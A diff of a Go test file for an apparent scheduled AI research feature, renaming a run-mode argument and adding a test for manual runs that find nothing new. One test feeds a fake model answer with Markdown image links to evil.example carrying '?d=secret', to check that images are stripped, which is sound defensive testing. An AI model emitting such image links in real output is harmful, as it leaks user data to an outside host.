@@ -83,7 +83,7 @@ func TestScheduledRunReportsOnlyWhatIsNew(t *testing.T) {
 	s := newRunnerServer(t, f, client)
 	sch := newRunnerSchedule(t, f)
 
-	s.runSchedule(ctx, sch, false)
+	s.runSchedule(ctx, sch, timedRun)
 
 	runs, _ := f.store.ListRuns(ctx, testUser.ID, sch.ID, 5)
 	if len(runs) != 1 || runs[0].Status != schedule.StatusNew || runs[0].NewCount != 1 || runs[0].MessageID == nil || runs[0].Rounds != 1 {
@@ -125,13 +125,13 @@ func TestScheduledRunReportsOnlyWhatIsNew(t *testing.T) {
 	// notification and no thread left behind. The first thread stays, its
 	// news read or not: it is the latest there is.
 	client.Results, client.Plain = researchRound("Still Dune: Part Three [1]."), "Still Dune: Part Three [1]."
-	s.runSchedule(ctx, sch, false)
+	s.runSchedule(ctx, sch, timedRun)
 	last := client.Histories[len(client.Histories)-1][0].Content
 	if err := f.store.MarkRead(ctx, testUser.ID, notes[0].ID); err != nil {
 		t.Fatal(err)
 	}
 	client.Results = researchRound("Still Dune: Part Three [1].")
-	s.runSchedule(ctx, sch, false)
+	s.runSchedule(ctx, sch, timedRun)
 	runs, _ = f.store.ListRuns(ctx, testUser.ID, sch.ID, 5)
 	if len(runs) != 3 || runs[0].ThreadID != nil || runs[1].ThreadID != nil || runs[2].ThreadID == nil || *runs[2].ThreadID != firstThread {
 		t.Fatalf("runs = %+v, want only the first still linked to a thread", runs)
@@ -150,7 +150,7 @@ func TestScheduledRunReportsOnlyWhatIsNew(t *testing.T) {
 	// hold news, and replaces the first one as any run does.
 	f.sllm.findings = nil
 	client.Results = researchRound("Maybe something [1].")
-	s.runSchedule(ctx, sch, false)
+	s.runSchedule(ctx, sch, timedRun)
 	lastThread := lastRunThread(t, f, sch)
 	if lastThread == firstThread {
 		t.Fatal("a later run wrote into the first run's thread")
@@ -216,7 +216,7 @@ func TestScheduledRunRefusesToolsOutsideItsSet(t *testing.T) {
 		return "videos", nil
 	}}
 	s := newServer(deps)
-	s.runSchedule(ctx, newRunnerSchedule(t, f), false)
+	s.runSchedule(ctx, newRunnerSchedule(t, f), timedRun)
 	if len(called) != 0 {
 		t.Fatalf("a tool outside the run's set ran: %v", called)
 	}
@@ -263,7 +263,7 @@ func TestScheduledRunGetsTheUsersMCPServersAndMemory(t *testing.T) {
 	sch := newRunnerSchedule(t, f)
 	// A file format in the prompt brings no file tools, so no guidance for them.
 	sch.Prompt = "summarize new videos as a PDF"
-	s.runSchedule(ctx, sch, false)
+	s.runSchedule(ctx, sch, timedRun)
 	if strings.Join(called, ",") != "peeq__search" {
 		t.Fatalf("called = %v, want the user's peeq search", called)
 	}
@@ -298,7 +298,7 @@ func TestScheduledRunAnswersFromTheToolFreeCall(t *testing.T) {
 	client := &fakeToolChatClient{Results: researchRound("DONE"), Plain: "Nothing new."}
 	s := newRunnerServer(t, f, client)
 	sch := newRunnerSchedule(t, f)
-	s.runSchedule(ctx, sch, false)
+	s.runSchedule(ctx, sch, timedRun)
 	// The research round, the round that ends it, the answer: no more.
 	if len(client.Histories) != 3 || len(client.Tools[2]) != 0 {
 		t.Fatalf("model calls = %d, want two research rounds and one tool-free answer", len(client.Histories))
@@ -322,7 +322,7 @@ func TestScheduledAnswerDropsImages(t *testing.T) {
 		Plain: "New: a talk ![poster](https://evil.example/p.png?d=secret) and ![![x](y)](https://evil.example/?d=nested), see [the page](https://arena.ch/programm)."}
 	s := newRunnerServer(t, f, client)
 	sch := newRunnerSchedule(t, f)
-	s.runSchedule(ctx, sch, false)
+	s.runSchedule(ctx, sch, timedRun)
 	messages, _, _ := f.chat.ListMessages(ctx, testUser.ID, lastRunThread(t, f, sch))
 	answer := messages[len(messages)-1]
 	if strings.Contains(answer.Content, "![") || strings.Contains(answer.Content, "evil.example") {
@@ -355,7 +355,7 @@ func TestScheduledRunOffersCategoryServersOnlyWhenTheyFit(t *testing.T) {
 			deps.LLM = client
 			deps.MCP = &fakeMCPService{ToolList: peeqTools(), ToolCategories: map[string][]string{"context7__docs": {"coding"}}, Result: "page"}
 			s := newServer(deps)
-			s.runSchedule(ctx, newRunnerSchedule(t, f), false)
+			s.runSchedule(ctx, newRunnerSchedule(t, f), timedRun)
 			offered := map[string]bool{}
 			for _, tool := range client.Tools[0] {
 				offered[tool.Function.Name] = true
@@ -382,7 +382,7 @@ func TestScheduledRunWithACutOffAnswerRecordsNoFindings(t *testing.T) {
 	f.deps.MCP = &fakeMCPService{ToolList: webTools(), Result: "page"}
 	s := newServer(f.deps)
 	sch := newRunnerSchedule(t, f)
-	s.runSchedule(ctx, sch, false)
+	s.runSchedule(ctx, sch, timedRun)
 	runs, _ := f.store.ListRuns(ctx, testUser.ID, sch.ID, 5)
 	if len(runs) != 1 || runs[0].Status != schedule.StatusFailed || runs[0].Error != "the answer was cut off" || runs[0].MessageID == nil {
 		t.Fatalf("run = %+v", runs)
@@ -416,7 +416,7 @@ func TestScheduledRunCutByShutdownLeavesANote(t *testing.T) {
 	ctx, cancel := context.WithCancel(context.Background())
 	finished := make(chan struct{})
 	go func() {
-		s.runSchedule(ctx, sch, false)
+		s.runSchedule(ctx, sch, timedRun)
 		close(finished)
 	}()
 	<-blocking.started
@@ -442,7 +442,7 @@ func TestScheduledRunStopsAtTheTokenBudget(t *testing.T) {
 	}
 	s := newRunnerServer(t, f, client)
 	sch := newRunnerSchedule(t, f)
-	s.runSchedule(ctx, sch, false)
+	s.runSchedule(ctx, sch, timedRun)
 	runs, _ := f.store.ListRuns(ctx, testUser.ID, sch.ID, 5)
 	if len(runs) != 1 || runs[0].Status != schedule.StatusTokenLimit || runs[0].NewCount != 1 || runs[0].Tokens < schedule.RunTokenBudget {
 		t.Fatalf("run = %+v", runs)
@@ -460,7 +460,7 @@ func runPastTheTimeLimit(t *testing.T, f *scheduleFixture, sch schedule.Schedule
 	f.deps.LLM = &blockingChatClient{started: make(chan struct{}), done: make(chan struct{})}
 	s := newServer(f.deps)
 	s.runTimeout = 50 * time.Millisecond
-	s.runSchedule(context.Background(), sch, false)
+	s.runSchedule(context.Background(), sch, timedRun)
 }
 
 // seedTimedOutRun stores an earlier run of sch that went past the limit.
@@ -504,7 +504,7 @@ func TestScheduledRunSoftDeadlineCutsARunningTool(t *testing.T) {
 	s := newServer(deps)
 	s.runTimeout, s.runSoftDeadline = 10*time.Second, 300*time.Millisecond
 	sch := newRunnerSchedule(t, f)
-	s.runSchedule(ctx, sch, false)
+	s.runSchedule(ctx, sch, timedRun)
 	runs, _ := f.store.ListRuns(ctx, testUser.ID, sch.ID, 5)
 	if len(runs) != 1 || runs[0].Status != schedule.StatusNothingNew || runs[0].MessageID == nil {
 		t.Fatalf("run = %+v, want an answer after the cut tool", runs)
@@ -622,7 +622,7 @@ func TestScheduledRunSoftDeadlineCutsTheRunningRound(t *testing.T) {
 	s := pacedServer(t, f, client, &fakeMCPService{ToolList: webTools(), Result: "page"})
 	s.runTimeout, s.runSoftDeadline = 10*time.Second, 300*time.Millisecond
 	sch := newRunnerSchedule(t, f)
-	s.runSchedule(ctx, sch, false)
+	s.runSchedule(ctx, sch, timedRun)
 
 	runs, _ := f.store.ListRuns(ctx, testUser.ID, sch.ID, 5)
 	if len(runs) != 1 || runs[0].Status != schedule.StatusNothingNew || runs[0].MessageID == nil || runs[0].Rounds != 1 {
@@ -647,7 +647,7 @@ func TestScheduledToolRoundsAskForTheLeastReasoning(t *testing.T) {
 	}}
 	s := pacedServer(t, f, client, &fakeMCPService{ToolList: webTools(), Result: "page"})
 	sch := newRunnerSchedule(t, f)
-	s.runSchedule(ctx, sch, false)
+	s.runSchedule(ctx, sch, timedRun)
 
 	if len(client.metas) != 2 {
 		t.Fatalf("calls = %+v", client.metas)
@@ -692,7 +692,7 @@ func TestScheduledRunBoundsItsTools(t *testing.T) {
 	}}
 	deps := f.deps
 	deps.LLM, deps.MCP = client, mcp
-	newServer(deps).runSchedule(ctx, newRunnerSchedule(t, f), false)
+	newServer(deps).runSchedule(ctx, newRunnerSchedule(t, f), timedRun)
 
 	if n := len(calls["tavily__tavily_search"]); n != 10 {
 		t.Fatalf("tavily calls = %d, want the run's limit of 10", n)
@@ -739,7 +739,7 @@ func TestScheduledRunFailureLeavesANote(t *testing.T) {
 	f.deps.LLM = &fakeChatClient{StreamErr: errors.New("upstream down")}
 	s := newServer(f.deps)
 	sch := newRunnerSchedule(t, f)
-	s.runSchedule(ctx, sch, false)
+	s.runSchedule(ctx, sch, timedRun)
 	runs, _ := f.store.ListRuns(ctx, testUser.ID, sch.ID, 5)
 	if len(runs) != 1 || runs[0].Status != schedule.StatusFailed || runs[0].Error == "" {
 		t.Fatalf("run = %+v", runs)
@@ -762,13 +762,13 @@ func TestScheduledRunKeepsAThreadTheUserAskedIn(t *testing.T) {
 	f := newScheduleFixture(t)
 	s := newRunnerServer(t, f, researchClient("Dune: Part Three [1]."))
 	sch := newRunnerSchedule(t, f)
-	s.runSchedule(ctx, sch, false)
+	s.runSchedule(ctx, sch, timedRun)
 	asked := lastRunThread(t, f, sch)
 	if _, err := f.chat.AddMessageWithAttachments(ctx, testUser.ID, asked, chat.RoleUser, "When does it open?", nil, nil, ""); err != nil {
 		t.Fatal(err)
 	}
 
-	s.runSchedule(ctx, sch, false)
+	s.runSchedule(ctx, sch, timedRun)
 	if _, found, _ := f.chat.GetThread(ctx, testUser.ID, asked); !found {
 		t.Fatal("a run replaced a thread the user asked something in")
 	}
@@ -784,7 +784,7 @@ func TestNothingNewRunKeepsAThreadTheUserTookUp(t *testing.T) {
 	f := newScheduleFixture(t)
 	s := newRunnerServer(t, f, researchClient("Dune: Part Three [1]."))
 	sch := newRunnerSchedule(t, f)
-	s.runSchedule(ctx, sch, false)
+	s.runSchedule(ctx, sch, timedRun)
 	first := lastRunThread(t, f, sch)
 
 	starred, err := f.chat.CreateThread(ctx, testUser.ID, chat.CreateThreadInput{Title: "Run", ScheduleID: &sch.ID})
@@ -805,16 +805,48 @@ func TestNothingNewRunKeepsAThreadTheUserTookUp(t *testing.T) {
 	}
 }
 
+// A manual run with nothing new keeps its thread, and the last news, read
+// or not, stays beside it.
+func TestManualNothingNewRunKeepsBothThreads(t *testing.T) {
+	ctx := context.Background()
+	f := newScheduleFixture(t)
+	f.sllm.findings = []llm.Finding{{Key: "dune-part-three", Label: "Dune: Part Three", Source: 1}}
+	client := researchClient("Dune: Part Three [1].")
+	s := newRunnerServer(t, f, client)
+	sch := newRunnerSchedule(t, f)
+	s.runSchedule(ctx, sch, timedRun)
+	news := lastRunThread(t, f, sch)
+	notes, _ := f.store.ListNotifications(ctx, testUser.ID, 10)
+	if len(notes) != 1 {
+		t.Fatalf("notifications = %+v", notes)
+	}
+	if err := f.store.MarkRead(ctx, testUser.ID, notes[0].ID); err != nil {
+		t.Fatal(err)
+	}
+
+	client.Results, client.Plain = researchRound("Still Dune: Part Three [1]."), "Still Dune: Part Three [1]."
+	s.runSchedule(ctx, sch, manualRun)
+	runs, _ := f.store.ListRuns(ctx, testUser.ID, sch.ID, 5)
+	if len(runs) != 2 || runs[0].Status != schedule.StatusNothingNew || runs[0].ThreadID == nil || *runs[0].ThreadID == news {
+		t.Fatalf("runs = %+v, want a nothing-new run with a thread of its own", runs)
+	}
+	for _, id := range []string{news, *runs[0].ThreadID} {
+		if _, found, _ := f.chat.GetThread(ctx, testUser.ID, id); !found {
+			t.Fatalf("thread %s is gone", id)
+		}
+	}
+}
+
 func TestFailedScheduledRunStillReplacesTheThreadBefore(t *testing.T) {
 	ctx := context.Background()
 	f := newScheduleFixture(t)
 	s := newRunnerServer(t, f, researchClient("Dune: Part Three [1]."))
 	sch := newRunnerSchedule(t, f)
-	s.runSchedule(ctx, sch, false)
+	s.runSchedule(ctx, sch, timedRun)
 	first := lastRunThread(t, f, sch)
 
 	f.deps.LLM = &fakeChatClient{StreamErr: errors.New("upstream down")}
-	newServer(f.deps).runSchedule(ctx, sch, false)
+	newServer(f.deps).runSchedule(ctx, sch, timedRun)
 	if _, found, _ := f.chat.GetThread(ctx, testUser.ID, first); found {
 		t.Fatal("a failed run kept the untouched thread before it")
 	}
@@ -829,7 +861,7 @@ func TestDeletingAScheduleTakesItsUntouchedRunThreads(t *testing.T) {
 	f := newScheduleFixture(t)
 	s := newRunnerServer(t, f, researchClient("Dune: Part Three [1]."))
 	sch := newRunnerSchedule(t, f)
-	s.runSchedule(ctx, sch, false)
+	s.runSchedule(ctx, sch, timedRun)
 	untouched := lastRunThread(t, f, sch)
 	asked, err := f.chat.CreateThread(ctx, testUser.ID, chat.CreateThreadInput{Title: "Asked", ScheduleID: &sch.ID})
 	if err != nil {
@@ -884,7 +916,7 @@ func TestPruneRunThreadsDropsOldUntouchedOnes(t *testing.T) {
 	f := newScheduleFixture(t)
 	s := newRunnerServer(t, f, researchClient("Dune: Part Three [1]."))
 	sch := newRunnerSchedule(t, f)
-	s.runSchedule(ctx, sch, false)
+	s.runSchedule(ctx, sch, timedRun)
 	untouched := lastRunThread(t, f, sch)
 	now := time.Now()
 
@@ -1187,7 +1219,7 @@ func TestScheduledRunDropsAThreadItCannotFill(t *testing.T) {
 	f.deps.Thread = promptlessStore{f.chat}
 	s := newServer(f.deps)
 	sch := newRunnerSchedule(t, f)
-	s.runSchedule(ctx, sch, false)
+	s.runSchedule(ctx, sch, timedRun)
 	runs, _ := f.store.ListRuns(ctx, testUser.ID, sch.ID, 5)
 	if len(runs) != 1 || runs[0].Status != schedule.StatusFailed || runs[0].Error != "could not store the prompt" || runs[0].ThreadID != nil {
 		t.Fatalf("run = %+v", runs)
